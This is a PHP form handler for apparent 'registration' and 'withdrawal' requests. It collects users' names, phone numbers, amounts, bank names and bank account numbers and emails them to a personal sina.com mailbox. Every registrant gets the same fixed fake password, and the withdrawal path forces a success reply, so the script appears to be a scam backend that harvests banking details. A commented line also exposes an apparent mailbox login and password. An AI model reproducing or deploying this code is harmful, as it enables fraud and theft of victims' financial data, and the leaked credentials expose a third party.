<?php
header("content-type:application/json;charset=utf-8");

//---------------邮件发送-------beg--------
date_default_timezone_set('Etc/UTC');
require 'PHPMailerAutoload.php';
//---------------邮件发送-------end--------


require 'fun.php';

//$act=$_POST["act"];
$act=!empty($_REQUEST["act"])?$_REQUEST["act"]:"";

if(!empty($act))
{
	//$uid,$uname,$phone,$money,$bank,$bankid,$validate

	
	$sTitle="";
	$sContent="";
	
	//注册
	if($act=="reg_add")
	{		
		$uid=$_POST["uid"];
		$uname=$_POST["uname"];
		$phone=$_POST["phone"];
		$money=$_POST["money"];
		$bank=$_POST["bank"];
		$bankid=$_POST["bankid"];
		//$validate=$_POST["validate"];
		
		$rzcode=$_POST["validate"];
		$rzcode = empty($rzcode) ? '' : strtolower($rzcode);
		
		//验证码检测
		if($rzcode == '' || $rzcode != strtolower(GetCkVdValue()))
		{			
			//Msg('验证码填写不正确!','');
			$data='{"tishi":"5","pass":"null"}';			
			echo $data;			
			exit();
		}	
		
		
		$uid=!empty($uid)?$uid:"";
		$uname=!empty($uname)?$uname:"";
		$phone=!empty($phone)?$phone:"";
		$money=!empty($money)?$money:"";
		$bank=!empty($bank)?$bank:"";
		$bankid=!empty($bankid)?$bankid:"";
		
		$pass="mypass";
		
		$sTitle="您的注册帐号信息";		
		$sContent="帐号:$uid\r\n";
		$sContent.="密码:$pass\r\n";
		$sContent.="姓名:$uname\r\n";
		$sContent.="手机:$phone\r\n";
		$sContent.="金额:$money\r\n";
		$sContent.="开户行:$bank\r\n";
		$sContent.="银行账户:$bankid\r\n";
		
		$isend=iSendMailEx($sTitle,$sContent);
	
		if($isend==true)
		{
			//$data='{"tishi":"1","pass":"mypass"}';
			$data='{"tishi":"1","pass":"'.$pass.'"}';
		}
		else
		{
			$data='{"tishi":"0","pass":"null"}';
		}
	}
	//提款
	else if($act=="tik_req")
	{
		
		$uid=$_POST["uid"];
		$uname=$_POST["uname"];
		$phone=$_POST["phone"];
		$money=$_POST["money"];
		$bank=$_POST["bank"];
		$bankid=$_POST["bankid"];
		//$validate=$_POST["validate"];
		
		$rzcode=$_POST["validate"];
		$rzcode = empty($rzcode) ? '' : strtolower($rzcode);
		
		//验证码检测
		if($rzcode == '' || $rzcode != strtolower(GetCkVdValue()))
		{			
			//Msg('验证码填写不正确!','');
			$data='{"tishi":"5","pass":"null"}';			
			echo $data;			
			exit();
		}	
		
		
		
		$uid=!empty($uid)?$uid:"";
		$uname=!empty($uname)?$uname:"";
		$phone=!empty($phone)?$phone:"";
		$money=!empty($money)?$money:"";
		$bank=!empty($bank)?$bank:"";
		$bankid=!empty($bankid)?$bankid:"";
		
		$pass="haha";
		
		$sTitle="您的提款信息";		
		$sContent="会员账户:$uid\r\n";
		$sContent.="开户姓名:$uname\r\n";
		$sContent.="联系电话:$phone\r\n";
		$sContent.="提款金额:$money\r\n";
		$sContent.="银行名称:$bank\r\n";
		$sContent.="银行账户:$bankid\r\n";

		$isend=iSendMailEx($sTitle,$sContent);
		$isend=true;
		
		if($isend==true)
		{			
			//$data='{"tishi":"1","pass":"mypass"}';
			$data='{"tishi":"1","pass":"'.$pass.'"}';
		}
		else
		{
			$data='{"tishi":"0","pass":"null"}';
		}
	}
	else if($act=="get_uid")
	{
		$mytm=date('dHis',time());
		$data='{"uid":"xae'.$mytm.'"}';
	}
	

	echo $data;
}

//-----------------------------------邮件发送-----------------------------------


function iSendMailEx($mysubject,$mycontent)
{
	$isend=iSendMail("q838149211@sina.com","password","q838149211@sina.com","yong","reguser",$mysubject,$mycontent);
	
	//$isend=iSendMail("m13538257788@163.com","tel135382577889","q838149211@sina.com","yong","reguser",$mysubject,$mycontent);

	//$isend=iSendMail("838149211@qq.com","password","q838149211@sina.com","yong","reguser",$mysubject,$mycontent);
	
	return $isend;
}

function iSendMail($sendFrom,$myPass,$sendTo,$fromName,$toName,$mysubject,$mycontent)
{
	//Create a new PHPMailer instance
	$mail = new PHPMailer;
	//Tell PHPMailer to use SMTP
	$mail->isSMTP();
	//Enable SMTP debugging
	// 0 = off (for production use)
	// 1 = client messages
	// 2 = client and server messages
	$mail->SMTPDebug = 0;
	//Ask for HTML-friendly debug output
	$mail->Debugoutput = 'html';

		$mail_sel=1;//qq邮箱没试成功
		
		//Set the hostname of the mail server
		if($mail_sel==1)
		{
			$mail->Host = "smtp.sina.com";
		}
		else if($mail_sel==2)
		{
			$mail->Host = "smtp.163.com";
		}
		else
		{
			$mail->Host = "smtp.qq.com";
		}

	//Set the SMTP port number - likely to be 25, 465 or 587
	$mail->Port = 25;
	//Whether to use SMTP authentication
	$mail->SMTPAuth = true;



	if($mail_sel==1)
	{		
		//Username to use for SMTP authentication
		$mail->Username = $sendFrom;
		//Password to use for SMTP authentication
		$mail->Password = $myPass;
		//Set who the message is to be sent from
		$mail->setFrom($sendFrom, $fromName);
		//Set an alternative reply-to address
		$mail->addReplyTo($sendFrom, $fromName);
		//Set who the message is to be sent to
		$mail->addAddress($sendTo, $toName);
	}
	else if($mail_sel==2)
	{

		//Username to use for SMTP authentication
		$mail->Username = $sendFrom;
		//Password to use for SMTP authentication
		$mail->Password = $myPass;
		//Set who the message is to be sent from
		$mail->setFrom($sendFrom, $fromName);
		//Set an alternative reply-to address
		$mail->addReplyTo($sendFrom, $fromName);
		//Set who the message is to be sent to
		$mail->addAddress($sendTo, $toName);
		
	}
	else
	{		
		//Username to use for SMTP authentication
		$mail->Username = $sendFrom;
		//Password to use for SMTP authentication
		$mail->Password = $myPass;
		//Set who the message is to be sent from
		$mail->setFrom($sendFrom, $fromName);
		//Set an alternative reply-to address
		$mail->addReplyTo($sendFrom, $fromName);
		//Set who the message is to be sent to
		$mail->addAddress($sendTo, $toName);
		
	}


	//Set the subject line
	$mail->Subject = $mysubject;
	//Read an HTML message body from an external file, convert referenced images to embedded,
	//convert HTML into a basic plain-text alternative body
	$mail->msgHTML(file_get_contents('contents.html'), dirname(__FILE__));
	//Replace the plain text body with one created manually
	$mail->AltBody = $mycontent;
	//Attach an image file
	$mail->addAttachment('images/logo.png');

	//send the message, check for errors
	if (!$mail->send()) {
		
		//echo "Mailer Error: " . $mail->ErrorInfo;
		return false;
	} else {
		//echo "Message sent!";
		return true;
	}



}

//------------------------------------------------------------------------------





?>